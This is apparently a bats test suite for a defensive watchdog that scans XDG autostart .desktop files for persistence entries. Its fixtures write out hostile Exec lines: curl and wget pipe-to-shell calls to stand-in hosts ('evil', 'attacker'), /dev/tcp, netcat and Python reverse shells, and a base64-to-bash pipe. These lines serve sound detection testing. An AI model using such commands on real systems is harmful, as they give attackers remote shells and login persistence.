#!/usr/bin/env bats
# L2 bats functional tests for the xdg-autostart-watchdog scan script.
#
# A .desktop file in an autostart dir runs its `Exec=` at the start of every
# desktop session (root's session for /root/.config/autostart, every
# session for /etc/xdg/autostart) — a login/session persistence vector. An
# Exec under a writable root, relative-with-slash, or carrying an injection
# pattern is alert; bare PATH-resolved commands are normal.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# autostart dir in a tmp sandbox via SELFDEF_XDG_DIRS.
#
# Run with: bats packaging/test/L2-xdg-autostart-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd/xdg-autostart-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    AUTOD="${TMP}/autostart"; mkdir -p "${AUTOD}"
    DESK="${AUTOD}/app.desktop"
}

teardown() { rm -rf "${TMP}"; }

desktop() { printf '[Desktop Entry]\nType=Application\nName=App\nExec=%s\n' "$1"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_XDG_PROFILE="${PROFILE:-report}" \
    SELFDEF_XDG_BASELINE="${BASELINE}" \
    SELFDEF_XDG_DIRS="${DIRS:-$AUTOD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no autostart dirs → ok / no_autostart_dirs" {
    DIRS="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_autostart_dirs"'
    cap | grep -q '"severity":"ok"'
}

@test "benign autostart entry, first run → ok / baseline_initial" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / xdg_autostart_intact" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xdg_autostart_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "Exec under a writable root → alert / xdg_autostart_suspicious" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd                                   # benign baseline
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xdg_autostart_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "Exec carrying a curl|sh payload → alert" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "curl http://evil|sh"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a relative-with-slash Exec → alert" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop ./rel/x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign Exec change → warn / xdg_autostart_changed" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /usr/bin/blueman-applet > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"xdg_autostart_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "a /usr/bin Exec is NOT flagged" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a bare PATH-resolved Exec is NOT flagged" {
    desktop 'pulseaudio --start' > "${DESK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    desktop /usr/bin/nm-applet > "${DESK}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious Exec" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — xdg-autostart inventory enumerates per-session exec surface)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (Exec under /var/tmp): writable-root expansion" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /var/tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (Exec under /dev/shm): tmpfs writable-root coverage" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /dev/shm/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (reverse-shell pattern in Exec)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in Exec)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "wget -qO- http://attacker/p | sh"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in Exec)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "echo YmFzaCAtaQ== | base64 -d | bash"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable .desktop file → alert)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    chmod 0666 "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-xdg-autostart -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no-auto-trust: xdg-autostart-watchdog does NOT refresh baseline on suspicious-Exec detection — alert STAYS until operator updates)" {
    # Login/session persistence primitive — alert MUST persist
    # across runs until operator explicitly re-baselines. Sister to
    # sshd-config, sudo-conf, gss-mech, ld-preload, nm-vpn-plugin,
    # openvpn-config — active-injection class never auto-trusts.
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: a second autostart dir ALSO scanned — both /etc/xdg/autostart + ~/.config/autostart)" {
    # xdg-autostart consults BOTH /etc/xdg/autostart (system) and
    # ~/.config/autostart (per-user). Both may carry attacker-planted
    # .desktop files — watchdog must enumerate every dir in
    # SELFDEF_XDG_DIRS.
    AUTOD2="${TMP}/autostart.user"; mkdir -p "${AUTOD2}"
    desktop /usr/bin/nm-applet > "${DESK}"
    DIRS="${AUTOD} ${AUTOD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    desktop /tmp/user-evil > "${AUTOD2}/user-app.desktop"
    DIRS="${AUTOD} ${AUTOD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant in Exec — sister to wget-pipe-sh axis)" {
    # Attacker may swap wget→curl and sh→bash. Both downloader-
    # tool and shell variants must trigger.
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'bash -c "curl -fsSL http://attacker/p | bash"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (Exec under /home: user-writable hijack coverage)" {
    # Operator's home dir is a writable-root variant. Symmetric to
    # /tmp + /var/tmp + /dev/shm axes already locked.
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /home/user/evil > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in Exec: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. XDG autostart .desktop entries
    # are run on every graphical login by every user (and per-
    # user autostart by the user's own login). T1547.013 — XDG
    # Autostart Entries; recurring trigger fires once per
    # graphical login session, and on a multi-user host that's
    # multiple times per day.
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=nc -e /bin/sh 1.1.1.1 4444\n' > "${AUTOD}/evil.desktop"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on XDG autostart surface)" {
    # Sister to nc / curl|bash / dev-tcp XDG autostart variants.
    # Python on every Debian/Ubuntu desktop. Locks python axis on
    # T1547.013 XDG Autostart per-graphical-login persistence.
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${AUTOD}/evil.desktop"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
